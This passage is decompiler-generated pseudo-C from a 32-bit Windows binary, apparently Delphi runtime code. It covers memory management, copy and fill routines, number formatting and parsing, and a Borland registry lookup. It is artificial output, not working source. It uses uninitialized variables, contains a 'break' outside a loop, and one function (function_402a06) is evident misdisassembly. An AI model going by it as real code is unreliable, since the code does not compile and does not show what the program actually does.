    int32_t v1; // 0x402294
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x40229f - 0x402479
int32_t function_40229f(void) {
    // 0x40229f
    int32_t v1; // 0x40229f
    int32_t v2 = v1 + 7 & -4; // 0x4022ab
    int32_t v3 = v2 > 12 ? v2 : 12;
    int32_t v4; // 0x40229f
    int32_t v5 = v4 - 4; // 0x4022ba
    int32_t * v6 = (int32_t *)v5; // 0x4022bd
    int32_t v7 = *v6 & 0x7ffffffc; // 0x4022c0
    int32_t v8 = v7 + v5; // 0x4022c8
    if (v7 == v3) {
        // 0x402472
        return v8 & -256 | 1;
    }
    int32_t v9; // 0x40229f
    if (v7 > v3) {
        int32_t v10 = v7 - v3; // 0x4022e1
        int32_t v11 = g72; // 0x4022e6
        if (v8 != v11) {
            int32_t v12 = v10; // 0x40232b
            if ((*(char *)v8 & 2) == 0) {
                // 0x40232d
                function_401a23();
                v12 = *(int32_t *)(v8 + 8) + v10;
            }
            // 0x40233a
            v9 = v7;
            if (v12 >= 12) {
                // 0x402340
                *(int32_t *)(v3 + v5) = v12 | 2;
                function_401ae7();
                v9 = v3;
            }
        } else {
            // 0x4022ee
            g72 = v11 - v10;
            int32_t v13 = g71; // 0x4022fa
            int32_t v14 = v13 + v10; // 0x4022fa
            g71 = v14;
            v9 = v3;
            if (v14 <= 11) {
                // 0x40230d
                g72 = v11;
                g71 = v13;
                v9 = v7;
            }
        }
        goto lab_0x402459;
      lab_0x402459:
        // 0x402459
        g58 += v9 - v7;
        int32_t v15 = *v6; // 0x402463
        *v6 = v15 & -0x7ffffffd | v9;
        // 0x402472
        return v15 & -0x80000000 | 1;
    }
    uint32_t v16 = v3 - v7;
    if (v8 == g72) {
        // 0x402372
        if (g71 >= v16) {
            // break -> 0x40237d
            break;
        }
        // 0x4023d0
        function_401d13();
    }
    int32_t v17 = v8; // 0x4023dc
    uint32_t v18; // 0x4023e2
    int32_t v19; // 0x402408
    int32_t v20; // 0x40241f
    int32_t * v21; // 0x402426
    if ((*(char *)v8 & 2) == 0) {
        // 0x4023de
        v18 = *(int32_t *)(v8 + 8);
        if (v18 >= v16) {
            // 0x4023ff
            function_401a23();
            v19 = v18 - v16;
            if (v19 < 12) {
                // 0x40241f
                v20 = v19 + v3;
                v21 = (int32_t *)(v20 + v5);
                *v21 = *v21 & -2;
                v9 = v20;
                goto lab_0x402459;
            } else {
                // 0x402411
                function_401c8b();
                v9 = v3;
                goto lab_0x402459;
            }
        }
        // 0x4023f1
        v17 = v18 + v8;
    }
    while (*(int32_t *)v17 <= -1 && (char)function_401e17() != 0) {
        // 0x402362
        if (v8 == g72) {
            // 0x402372
            if (g71 >= v16) {
                // break -> 0x40237d
                break;
            }
            // 0x4023d0
            function_401d13();
        }
        // 0x4023d9
        v17 = v8;
        if ((*(char *)v8 & 2) == 0) {
            // 0x4023de
            v18 = *(int32_t *)(v8 + 8);
            if (v18 >= v16) {
                // 0x4023ff
                function_401a23();
                v19 = v18 - v16;
                if (v19 < 12) {
                    // 0x40241f
                    v20 = v19 + v3;
                    v21 = (int32_t *)(v20 + v5);
                    *v21 = *v21 & -2;
                    v9 = v20;
                    goto lab_0x402459;
                } else {
                    // 0x402411
                    function_401c8b();
                    v9 = v3;
                    goto lab_0x402459;
                }
            }
            // 0x4023f1
            v17 = v18 + v8;
        }
    }
    // 0x402472
    return 0;
}

// Address range: 0x40247b - 0x40252c
int32_t function_40247b(int32_t a1) {
    // 0x40247b
    if (g61 == 0) {
        // 0x40248f
        int32_t v1; // 0x40247b
        if ((char)function_40187f(v1) == 0) {
            int32_t result = function_402533(0, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x40249d
            return result;
        }
    }
    int32_t v2 = __readfsdword(0); // bp-32, 0x4024aa
    int32_t v3 = &v2; // 0x4024aa
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x4024b7
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v5 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-36, 0x4024b9
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v4 = (int32_t)&v5;
    }
    // 0x4024c3
    if ((char)function_40229f() == 0) {
        // 0x4024d5
        if (function_401f6b() != 0) {
            // 0x4024f7
            function_402643();
            function_4020fb();
        }
    }
    // 0x40250b
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x402533;
    int32_t result2 = 0; // 0x40251f
    if (g51 != 0) {
        // 0x402521
        *(int32_t *)(v4 + 4) = (int32_t)&g63;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
        result2 = &g118;
    }
    // 0x40252b
    return result2;
}

// Address range: 0x40252c - 0x402531
int32_t function_40252c(void) {
    // 0x40252c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x402531 - 0x402533
int32_t function_402531(void) {
    // 0x402531
    int32_t result; // 0x402531
    return result;
}

// Address range: 0x402533 - 0x40253c
int32_t function_402533(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x402533
    int32_t v1; // 0x402533
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x40253f - 0x40255f
int32_t function_40253f(void) {
    // 0x40253f
    int32_t v1; // 0x40253f
    if (v1 < 1) {
        // 0x40255b
        return 0;
    }
    int32_t result = function_401f6b(); // 0x402544
    if (result != 0) {
        // 0x40255b
        return result;
    }
    // 0x402550
    function_402627((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x40255f - 0x40257f
int32_t function_40255f(void) {
    // 0x40255f
    int32_t v1; // 0x40255f
    if (v1 == 0 || function_4020fb() == 0) {
        // 0x40257b
        return 0;
    }
    // 0x402570
    function_402627((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x40257f - 0x4025cc
int32_t function_40257f(void) {
    // 0x40257f
    int32_t v1; // 0x40257f
    int32_t v2; // 0x40257f
    if (v2 == 0) {
        // 0x4025b7
        if (v1 == 0) {
            // 0x4025af
            return 0;
        }
        // 0x4025bb
        if (function_401f6b() != 0) {
            // 0x4025c9
            abort();
            // UNREACHABLE
        }
        // 0x4025b0
        function_402627((int32_t)&g118);
        // UNREACHABLE
    }
    if (v1 == 0) {
        // 0x4025a1
        *(int32_t *)v2 = 0;
        int32_t result = function_4020fb(); // 0x4025a5
        if (result == 0) {
            // 0x4025af
            return result;
        }
        // 0x40259a
        function_402627((int32_t)&g118);
        // UNREACHABLE
    }
    int32_t result2 = function_40247b(v2); // 0x40258c
    if (result2 != 0) {
        // 0x402597
        *(int32_t *)v2 = result2;
        return result2;
    }
    // 0x4025b0
    function_402627((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x4025cf - 0x4025da
int32_t function_4025cf(void) {
    // 0x4025cf
    function_4033df();
    // UNREACHABLE
}

// Address range: 0x4025da - 0x4025db
int32_t function_4025da(void) {
    // 0x4025da
    int32_t result; // 0x4025da
    return result;
}

// Address range: 0x4025db - 0x402622
int32_t function_4025db(void) {
    // 0x4025db
    int32_t v1; // 0x4025db
    if ((v1 & 127) == 0) {
        // 0x4025fb
        function_4042f7();
    }
    // 0x402617
    function_4025cf();
    // UNREACHABLE
}

// Address range: 0x402622 - 0x402625
int32_t function_402622(int32_t a1, int32_t a2) {
    // 0x402622
    int32_t result; // 0x402622
    return result;
}

// Address range: 0x402627 - 0x402632
int32_t function_402627(int32_t a1) {
    // 0x402627
    return function_4025db();
}

// Address range: 0x402632 - 0x402633
int32_t function_402632(void) {
    // 0x402632
    int32_t result; // 0x402632
    return result;
}

// Address range: 0x402633 - 0x402643
int32_t function_402633(int32_t a1, int32_t a2) {
    // 0x402633
    return function_4042f7();
}

// Address range: 0x402643 - 0x402683
int32_t function_402643(void) {
    // 0x402643
    uint32_t v1; // 0x402643
    uint32_t result; // 0x402643
    uint32_t v2; // 0x402643
    if (v1 > v2) {
        if (result >= 0) {
            int32_t v3 = result - 4; // 0x402662
            int32_t v4 = v3 + v1; // 0x402666
            int32_t v5 = result / 4; // 0x40266a
            __asm_rep_movsd_memcpy((char *)v4, (char *)(v3 + v2), v5);
            char * v6 = (char *)((-4 * v5 | 3) + v4); // 0x40267d
            __asm_rep_movsb_memcpy(v6, v6, result & 3);
        }
        // 0x402680
        return result;
    }
    if (v1 == v2) {
        // 0x402680
        return result;
    }
    if (result < 0) {
        // 0x402680
        return result;
    }
    int32_t v7 = (int32_t)result / 4; // 0x402651
    __asm_rep_movsd_memcpy((char *)v1, (char *)v2, v7);
    bool v8; // 0x402643
    char * v9 = (char *)((v8 ? -4 : 4) * v7 + v1); // 0x40265d
    __asm_rep_movsb_memcpy(v9, v9, result & 3);
    return result;
}

// Address range: 0x402683 - 0x4026a8
int32_t function_402683(void) {
    // 0x402683
    int32_t lpPerformanceCount; // bp-8, 0x402683
    if (!QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount)) {
        int32_t result = function_401187(); // 0x40269b
        g10 = result;
        return result;
    }
    int32_t result2 = &lpPerformanceCount; // 0x402690
    g10 = result2;
    return result2;
}

// Address range: 0x4026ab - 0x4026ba
int32_t function_4026ab(void) {
    // 0x4026ab
    int32_t v1; // 0x4026ab
    g14 = v1;
    return __asm_fnclex();
}

// Address range: 0x4026bb - 0x4026c2
int32_t function_4026bb(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4026bb
    return 0;
}

// Address range: 0x4026c3 - 0x402719
int32_t function_4026c3(void) {
    // 0x4026c3
    int32_t v1; // 0x4026c3
    int16_t v2 = *(int16_t *)(v1 + 4); // 0x4026c9
    int32_t result; // 0x4026c3
    int32_t v3; // 0x4026c3
    int32_t v4; // 0x4026c3
    if (v2 < 0xd7b4) {
        int32_t v5 = (v2 & -0x284e) != -0x284e ? 0 : v1;
        int32_t v6 = v5 != 0 ? v5 : v1;
        result = 0;
        if (v6 != 0) {
            // 0x4026f9
            function_402633(v4, v3);
            result = v6;
        }
    } else {
        // 0x402702
        result = 0;
        if (v1 != (int32_t)&g53) {
            // 0x40270a
            function_402633(v4, v3);
            result = 0;
        }
    }
    // 0x402714
    return result;
}

// Address range: 0x40271b - 0x402736
int32_t function_40271b(void) {
    // 0x40271b
    int32_t v1; // 0x40271b
    unsigned char v2 = (char)v1;
    int32_t v3; // 0x40271b
    unsigned char v4 = (char)v3;
    int32_t v5; // 0x40271b
    *(char *)v5 = v2 < v4 ? v2 : v4;
    return function_402643();
}

// Address range: 0x402737 - 0x4027a6
int32_t function_402737(void) {
    // 0x402737
    uint32_t v1; // 0x402737
    int32_t v2 = (uint32_t)(v1 / 4); // 0x40273f
    int32_t result; // 0x402737
    int32_t v3; // 0x402737
    if (v1 < 4) {
        goto lab_0x402767;
      lab_0x402767:;
        int32_t v4 = v1 & 3; // 0x402768
        if (v4 == 0 || *(char *)result != *(char *)v3) {
            // 0x402789
            return result;
        }
        int32_t v5 = v4 - 1; // 0x402773
        if (v5 == 0) {
            // 0x402789
            return 0;
        }
        // 0x402776
        if (*(char *)(result + 1) != *(char *)(v3 + 1)) {
            // 0x402789
            return result;
        }
        // 0x40277e
        if (v5 == 1 || *(char *)(result + 2) == *(char *)(v3 + 2)) {
            // 0x402789
            return 0;
        }
        // 0x402789
        return result;
    }
    int32_t v6; // 0x402737
    int32_t v7 = v6;
    int32_t v8; // 0x402737
    int32_t result2 = v8;
    while (*(int32_t *)result2 == *(int32_t *)v7) {
        int32_t v9 = result2 + 4;
        if (v2 == 1) {
            // 0x402761
            result = v9;
            v3 = v7 + 4;
            goto lab_0x402767;
        }
        // 0x40274c
        if (*(int32_t *)v9 != *(int32_t *)(v7 + 4)) {
            // break -> 0x4027a3
            break;
        }
        int32_t v10 = result2 + 8; // 0x402756
        int32_t v11 = v7 + 8; // 0x402759
        v2 -= 2;
        result = v10;
        v3 = v11;
        if (v2 == 0) {
            goto lab_0x402767;
        }
        v7 = v11;
        result2 = v10;
    }
    // 0x402789
    return result2;
}

// Address range: 0x4027a7 - 0x4027c6
int32_t function_4027a7(void) {
    // 0x4027a7
    int32_t v1; // 0x4027a7
    int32_t v2 = 256 * v1 & 0xff00 | v1 & -0xff01; // 0x4027aa
    int32_t result = 0x10000 * v2 | v2 & 0xffff; // 0x4027b1
    uint32_t v3; // 0x4027a7
    if (v3 >= 0) {
        int32_t v4 = v3 / 4; // 0x4027b6
        int32_t v5; // 0x4027a7
        __asm_rep_stosd_memset((char *)v5, result, v4);
        bool v6; // 0x4027a7
        int32_t v7 = v6 ? -4 : 4; // 0x4027bb
        __asm_rep_stosb_memset((char *)(v7 * v4 + v5), (char)v1, v3 & 3);
    }
    // 0x4027c4
    return result;
}

// Address range: 0x4027c7 - 0x402826
int32_t function_4027c7(void) {
    // 0x4027c7
    int32_t v1; // bp-36, 0x4027c7
    int32_t v2 = &v1; // 0x4027cb
    int32_t v3 = 0;
    int32_t v4; // 0x4027c7
    uint32_t v5 = v4 < 0 ? -v4 : v4;
    int32_t v6 = v5 / 10; // 0x4027e0
    *(char *)(v3 + v2) = (char)(v5 % 10) | 48;
    int32_t v7 = v3 + 1; // 0x4027e8
    while (v5 >= 10) {
        // 0x4027de
        v3 = v7;
        v5 = v6;
        v6 = v5 / 10;
        *(char *)(v3 + v2) = (char)(v5 % 10) | 48;
        v7 = v3 + 1;
    }
    int32_t v8 = v7; // 0x4027ef
    if (v4 < 0) {
        // 0x4027f1
        *(char *)(v7 + v2) = 45;
        v8 = v3 + 2;
    }
    char v9 = v8; // 0x4027f6
    int32_t v10; // 0x4027c7
    char * v11 = (char *)v10; // 0x4027f6
    *v11 = v9;
    int32_t v12 = v10 + 1; // 0x4027f8
    int32_t v13; // 0x4027c7
    int32_t v14 = v13 < 255 ? v13 : 255;
    int32_t v15 = v6; // 0x40280c
    int32_t v16 = v12; // 0x40280c
    if (v14 > v8) {
        int32_t v17 = v14 - v8; // 0x40280a
        *v11 = (char)v17 + v9;
        __asm_rep_stosb_memset((char *)v12, 32, v17);
        v15 = v6 & 0x1fffff00 | 32;
        bool v18; // 0x4027c7
        v16 = v17 * (v18 ? -1 : 1) + v12;
    }
    int32_t result = v15; // 0x402815
    int32_t v19 = v8;
    int32_t v20 = v16; // 0x4027c7
    v19--;
    unsigned char v21 = *(char *)(v19 + v2); // 0x402815
    result = result & -256 | (int32_t)v21;
    *(char *)v20 = v21;
    v20++;
    while (v19 != 0) {
        // 0x402815
        v19--;
        v21 = *(char *)(v19 + v2);
        result = result & -256 | (int32_t)v21;
        *(char *)v20 = v21;
        v20++;
    }
    // 0x40281f
    return result;
}

// Address range: 0x402827 - 0x402831
int32_t function_402827(int32_t a1, int32_t a2) {
    // 0x402827
    return function_4027c7();
}

// Address range: 0x402833 - 0x402904
int32_t function_402833(void) {
    // 0x402833
    int32_t v1; // 0x402833
    int32_t v2; // 0x402833
    int32_t v3; // 0x402833
    int32_t v4; // 0x402833
    int32_t v5; // 0x402833
    int32_t v6; // 0x402833
    int32_t v7; // 0x402846
    int32_t v8; // 0x402848
    if (v6 == 0) {
        goto lab_0x4028b2;
    } else {
        while (true) {
          lab_0x402846:;
            // 0x402846
            int32_t v9; // 0x402833
            v4 = v9;
            unsigned char v10 = *(char *)v4; // 0x402846
            int32_t v11; // 0x402833
            v7 = v11 & -256;
            int32_t v12 = v7 | (int32_t)v10; // 0x402846
            v8 = v4 + 1;
            v11 = v12;
            v9 = v8;
            v2 = 0;
            v1 = v12;
            v5 = v8;
            v3 = 256;
            switch (v10) {
                case 32: {
                    goto lab_0x402846;
                }
                case 45: {
                    goto lab_0x4028b9;
                }
                case 43: {
                    // 0x4028b9
                    v3 = 0;
                    goto lab_0x4028b9;
                }
                default: {
                    goto lab_0x40285a;
                }
            }
        }
    }
  lab_0x40289f:;
    // 0x40289f
    int32_t v13; // 0x402833
    int32_t result2; // 0x402833
    int32_t v14; // 0x402833
    if ((v2 & 0xff00) == 256) {
        int32_t result = -v13; // 0x4028ac
        if (v13 == 0 || result < 0) {
            // 0x4028fe
            *(int32_t *)v14 = 0;
            return result;
        }
    } else {
        // 0x4028a3
        result2 = v13;
        if (v13 >= 0) {
          lab_0x4028fe:
            // 0x4028fe
            *(int32_t *)v14 = 0;
            return result2;
        }
    }
    goto lab_0x4028b2;
  lab_0x4028b9:
    // 0x4028b9
    v2 = v3;
    v1 = v7 | (int32_t)*(char *)v8;
    v5 = v4 + 2;
    goto lab_0x40285a;
  lab_0x40285a:;
    char v38 = v1; // 0x40285a
    int32_t v19 = v1; // 0x402833
    int32_t v16 = v5; // 0x402833
    int32_t v32; // 0x402833
    int32_t v30; // 0x402833
    switch (v38) {
        case 36: {
            goto lab_0x4028be;
        }
        case 120: {
            goto lab_0x4028be;
        }
        case 88: {
            goto lab_0x4028be;
        }
        default: {
            if (v38 != 48) {
                // 0x402881
                v32 = v1;
                v30 = v5;
                if (v38 == 0) {
                    goto lab_0x4028b2;
                } else {
                    goto lab_0x402885;
                }
            } else {
                unsigned char v39 = *(char *)v5; // 0x40286e
                int32_t v40 = v1 & -256 | (int32_t)v39; // 0x40286e
                int32_t v41 = v5 + 1; // 0x402870
                v32 = v40;
                v30 = v41;
                v13 = 0;
                v19 = v40;
                v16 = v41;
                switch (v39) {
                    case 120: {
                        goto lab_0x4028be;
                    }
                    case 88: {
                        goto lab_0x4028be;
                    }
                    case 0: {
                        goto lab_0x40289f;
                    }
                    default: {
                        goto lab_0x402885;
                    }
                }
            }
        }
    }
  lab_0x4028a9:
    // 0x4028a9
    goto lab_0x4028b2;
  lab_0x4028b2:
    // 0x4028fe
    *(int32_t *)v14 = 1 - v6;
    return 0;
  lab_0x4028be:;
    unsigned char v15 = *(char *)v16; // 0x4028c3
    if (v15 == 0) {
        goto lab_0x4028a9;
    } else {
        int32_t v17 = v16 + 1;
        int32_t v18 = v19 & -256 | (int32_t)v15;
        int32_t v20 = 0;
        int32_t v21 = v18; // 0x4028cd
        if ((char)v18 >= 97) {
            // 0x4028cf
            v21 = v18 + 224 & 255 | v18 & -256;
        }
        int32_t v22 = v21;
        int32_t v23 = v22 + 208; // 0x4028d2
        unsigned char v24 = (char)v23; // 0x4028d5
        int32_t v25 = v23; // 0x4028d8
        if (v24 >= 10) {
            // 0x4028da
            if (v24 >= 23) {
                // break -> 0x4028b2
                break;
            }
            // 0x4028e2
            v25 = v22 + 201;
        }
        // 0x4028e5
        while (v20 <= 0xfffffff) {
            int32_t v26 = v22 & -256; // 0x4028d2
            int32_t v27 = (v25 & 255 | v26) + 16 * v20; // 0x4028ec
            unsigned char v28 = *(char *)v17; // 0x4028ee
            if (v28 == 0) {
                // 0x4028f5
                result2 = (v2 & 0xff00) != 256 ? v27 : -v27;
                goto lab_0x4028fe;
            }
            v17++;
            v18 = v26 | (int32_t)v28;
            v20 = v27;
            v21 = v18;
            if ((char)v18 >= 97) {
                // 0x4028cf
                v21 = v18 + 224 & 255 | v18 & -256;
            }
            // 0x4028d2
            v22 = v21;
            v23 = v22 + 208;
            v24 = (char)v23;
            v25 = v23;
            if (v24 >= 10) {
                // 0x4028da
                if (v24 >= 23) {
                    // break -> 0x4028b2
                    break;
                }
                // 0x4028e2
                v25 = v22 + 201;
            }
        }
        goto lab_0x4028b2;
    }
  lab_0x402885:;
    int32_t v29 = v30;
    int32_t v31 = v32;
    int32_t v33 = 0;
    int32_t v34 = v31 + 208; // 0x402885
    while (v33 <= 0xccccccc && (char)v34 <= 9) {
        int32_t v35 = v31 & -256; // 0x402885
        int32_t v36 = (v34 & 255 | v35) + 10 * v33; // 0x402896
        unsigned char v37 = *(char *)v29; // 0x402898
        v13 = v36;
        if (v37 == 0) {
            goto lab_0x40289f;
        }
        v29++;
        v31 = v35 | (int32_t)v37;
        v33 = v36;
        v34 = v31 + 208;
    }
    goto lab_0x4028b2;
}

// Address range: 0x402907 - 0x402912
int32_t function_402907(void) {
    // 0x402907
    return function_402913();
}

// Address range: 0x402913 - 0x402936
int32_t function_402913(void) {
    // 0x402913
    uint32_t v1; // 0x402913
    int32_t v2 = v1 < 255 ? v1 : 255; // 0x40292c
    int32_t v3; // 0x402913
    char v4 = *(char *)v3; // 0x402922
    int32_t v5; // 0x402913
    int32_t v6 = v5; // 0x402927
    while (v4 != 0) {
        int32_t v7 = v5 + 1; // 0x402929
        *(char *)v7 = v4;
        v2--;
        v5 = v7;
        v3++;
        v6 = v7;
        if (v2 == 0) {
            // break -> 0x40292f
            break;
        }
        v4 = *(char *)v3;
        v6 = v5;
    }
    // 0x40292f
    int32_t v8; // 0x402913
    int32_t result = v6 - v8; // 0x402930
    *(char *)v8 = (char)result;
    return result;
}

// Address range: 0x402937 - 0x40293d
int32_t function_402937(int32_t nTypeFlag) {
    // 0x402937
    return GetKeyboardType(nTypeFlag);
}

// Address range: 0x40293f - 0x40296e
int32_t function_40293f(void) {
    // 0x40293f
    int32_t nTypeFlag; // 0x40293f
    if (GetKeyboardType(nTypeFlag) != 7) {
        // 0x40296a
        return 0;
    }
    int32_t v1 = GetKeyboardType(1) & 0xff00; // 0x402955
    return v1 == 1024 | v1 == 3328;
}

// Address range: 0x40296f - 0x402a06
int32_t function_40296f(void) {
    // 0x40296f
    int32_t v1; // bp-8, 0x40296f
    int32_t v2; // 0x40296f
    int32_t v3 = function_40114f(v2, (int32_t)g14, &v1, 1, 0, "SOFTWARE\\Borland\\Delphi\\RTL", -0x7ffffffe); // 0x402991
    if (v3 != 0) {
        int16_t v4 = g14 & -64 | g14 & 63; // 0x4029f9
        g14 = v4;
        return v3 & -0x10000 | (int32_t)v4;
    }
    int32_t v5 = __readfsdword(0); // bp-48, 0x4029a2
    __writefsdword(0, (int32_t)&v5);
    function_401157(4);
    __writefsdword(0, v1);
    return function_401147(v1);
}

// Address range: 0x402a06 - 0x402ae9
int32_t function_402a06(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18) {
    int32_t v1 = a1;
    int32_t v2 = a6;
    int32_t v3; // 0x402a06
    char * v4 = (char *)(v3 + 79); // 0x402a06
    unsigned char v5 = *v4; // 0x402a06
    int32_t v6; // 0x402a06
    unsigned char v7 = v5 + (char)v6; // 0x402a06
    *v4 = v7;
    int32_t v8; // 0x402a06
    __asm_outsd((int16_t)v6 + 1, *(int32_t *)(v8 + 1));
    if (v7 < v5) {
        // 0x402a80
        return function_402bc7();
    }
    int16_t v9 = a16; // 0x402a15
    __asm_outsb(v9, (char)a18);
    int32_t v10; // 0x402a06
    *(char *)v10 = __asm_insb(v9);
    int64_t v11 = (int64_t)*(int32_t *)(a16 + 84 + 2 * a16); // 0x402a1d
    int32_t v12 = a7; // 0x402a28
    int32_t result = a9; // 0x402a28
    int32_t * v13 = &v2; // 0x402a28
    int32_t v14 = a18; // 0x402a28
    if (0x5046004c * v11 != 0x5046004c00000000 * v11 / 0x100000000) {
        // 0x402a2a
        v12 = v1;
        *(char *)a12 = __asm_insb((int16_t)a3);
        if (a18 == 1) {
            char * v15 = (char *)v12; // 0x402a2f
            *v15 = *v15 + 2 * (char)v12;
            return __asm_wait();
        }
        // 0x402a94
        v1 = v2;
        result = a3;
        v13 = &v1;
        v14 = a12;
    }
    int32_t v16 = (int32_t)v13;
    int32_t v17 = v16 - 4; // 0x402a95
    *(int32_t *)v17 = v14;
    *(int32_t *)result = v12;
    bool v18; // 0x402a06
    int32_t v19 = v18 ? -4 : 4; // 0x402a9a
    int32_t v20 = result + v19; // 0x402a9a
    uint32_t v21 = *(int32_t *)(v12 - 40); // 0x402a9b
    int32_t * v22 = (int32_t *)(v16 - 8); // 0x402aa0
    *v22 = v21;
    int32_t v23 = v21 / 4 - 1; // 0x402aa4
    __asm_rep_stosd_memset((char *)v20, 0, v23);
    __asm_rep_stosb_memset((char *)(v23 * v19 + v20), 0, *v22 & 3);
    int32_t v24 = *(int32_t *)(v12 - 72); // 0x402ab1
    int32_t v25 = v17; // 0x402ab6
    if (v24 != 0) {
        // 0x402ab8
        v25 = v17 - 4;
        *(int32_t *)v25 = v24;
    }
    int32_t v26 = v25;
    int32_t v27 = *(int32_t *)(v12 - 36); // 0x402ab9
    while (v27 != 0) {
        int32_t v28 = *(int32_t *)v27; // 0x402ac0
        int32_t v29 = v26;
        v24 = *(int32_t *)(v28 - 72);
        v25 = v29;
        if (v24 != 0) {
            // 0x402ab8
            v25 = v29 - 4;
            *(int32_t *)v25 = v24;
        }
        // 0x402ab9
        v26 = v25;
        v27 = *(int32_t *)(v28 - 36);
    }
    // 0x402ac4
    if (v26 == v17) {
        // 0x402ae5
        return result;
    }
    int32_t v30 = v26; // 0x402ac6
    int32_t v31 = *(int32_t *)v30; // 0x402ac8
    int32_t v32 = *(int32_t *)v31; // 0x402acb
    int32_t v33 = v31 + 4;
    int32_t v34 = *(int32_t *)(v33 + 16); // 0x402ace
    if (v34 != 0) {
        // 0x402ad5
        *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
    }
    // 0x402adb
    v32--;
    int32_t v35 = v33 + 28; // 0x402adf
    while (v32 != 0) {
        // 0x402ace
        v33 = v35;
        v34 = *(int32_t *)(v33 + 16);
        if (v34 != 0) {
            // 0x402ad5
            *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
        }
        // 0x402adb
        v32--;
        v35 = v33 + 28;
    }
    // 0x402ae1
    v30 += 4;
    while (v30 != v17) {
        // 0x402ac8
        v31 = *(int32_t *)v30;
        v32 = *(int32_t *)v31;
        v33 = v31 + 4;
        v34 = *(int32_t *)(v33 + 16);
        if (v34 != 0) {
            // 0x402ad5
            *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
        }
        // 0x402adb
        v32--;
        v35 = v33 + 28;
        while (v32 != 0) {
            // 0x402ace
            v33 = v35;
            v34 = *(int32_t *)(v33 + 16);
            if (v34 != 0) {
                // 0x402ad5
                *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
            }
            // 0x402adb
            v32--;
            v35 = v33 + 28;
        }
        // 0x402ae1
        v30 += 4;
    }
    // 0x402ae5
    return result;
}

// Address range: 0x402aeb - 0x402b0b
int32_t function_402aeb(int32_t a1) {
    int32_t v1; // 0x402aeb
    int32_t v2 = *(int32_t *)v1; // 0x402af1
    int32_t v3 = *(int32_t *)(v2 - 36); // 0x402af6
    if (*(int32_t *)(v2 - 64) != 0) {
        // 0x402afd
        function_4039a7();
    }
    // 0x402aeb
    while (v3 != 0) {
        // 0x402af1
        v2 = *(int32_t *)v3;
        v3 = *(int32_t *)(v2 - 36);
        if (*(int32_t *)(v2 - 64) != 0) {
            // 0x402afd
            function_4039a7();
        }
    }
    // 0x402b08
    int32_t result; // 0x402aeb
    return result;
}

// Address range: 0x402b0b - 0x402b39
int32_t function_402b0b(int32_t a1, int32_t a2) {
    int32_t v1; // 0x402b0b
    int32_t v2 = *(int32_t *)(v1 - 48); // 0x402b11
    int32_t v3; // 0x402b0b
    int32_t v4; // 0x402b0b
    int32_t v5; // bp-4, 0x402b0b
    int32_t result; // 0x402b0b
    int32_t v6; // 0x402b1c
    int32_t v7; // 0x402b1f
    bool v8; // 0x402b0b
    uint16_t v9; // 0x402b18
    int32_t v10; // 0x402b18
    if (v2 != 0) {
        // 0x402b18
        v9 = *(int16_t *)v2;
        v10 = v9;
        *(int32_t *)((int32_t)&v5 - 4) = v10;
        v6 = v2 + 2;
        v4 = v6;
        v3 = v10;
        if (v9 == 0) {
            // ._crit_edge
            if (v6 == 0) {
                // 0x402b2e
                return 2 * v10;
            }
        } else {
            v7 = v3 - 1;
            while (*(int16_t *)v4 != (int16_t)result) {
                // .lr.ph
                v4 += (v8 ? -2 : 2);
                if (v7 == 0) {
                    // break -> 0x402b25
                    break;
                }
                v7--;
            }
            // 0x402b2e
            return 2 * v10 - v7;
        }
    }
    int32_t v11 = *(int32_t *)(v1 - 36); // 0x402b25
    // 0x402b0b
    while (v11 != 0) {
        // 0x402b0f
        v1 = *(int32_t *)v11;
        v2 = *(int32_t *)(v1 - 48);
        if (v2 != 0) {
            // 0x402b18
            v9 = *(int16_t *)v2;
            v10 = v9;
            *(int32_t *)((int32_t)&v5 - 4) = v10;
            v6 = v2 + 2;
            v4 = v6;
            v3 = v10;
            if (v9 == 0) {
                // ._crit_edge
                if (v6 == 0) {
                    // 0x402b2e
                    return 2 * v10;
                }
            } else {
                v7 = v3 - 1;
                while (*(int16_t *)v4 != (int16_t)result) {
                    // .lr.ph
                    v4 += (v8 ? -2 : 2);
                    if (v7 == 0) {
                        // break -> 0x402b25
                        break;
                    }
                    v7--;
                }
                // 0x402b2e
                return 2 * v10 - v7;
            }
        }
        // 0x402b25
        v11 = *(int32_t *)(v1 - 36);
    }
    // 0x402b2c
    return result;
}

// Address range: 0x402b3b - 0x402b41
int32_t function_402b3b(void) {
    // 0x402b3b
    return -0x7fff0001;
}

// Address range: 0x402b43 - 0x402b44
int32_t function_402b43(void) {
    // 0x402b43
    int32_t result; // 0x402b43
    return result;
}

// Address range: 0x402b47 - 0x402b48
int32_t function_402b47(void) {
    // 0x402b47
    int32_t result; // 0x402b47
    return result;
}

// Address range: 0x402b4b - 0x402b4c
int32_t function_402b4b(void) {
    // 0x402b4b
    int32_t result; // 0x402b4b
    return result;
}

// Address range: 0x402b4f - 0x402b75
int32_t function_402b4f(void) {
    // 0x402b4f
    int32_t v1; // 0x402b4f
    uint16_t v2 = (int16_t)v1;
    int32_t result; // 0x402b4f
    if (v2 != 0 && v2 < 0xc000) {
        // 0x402b5f
        int32_t v3; // 0x402b4f
        function_402b0b(v3, result);
    }
    // 0x402b6a
    return result;
}

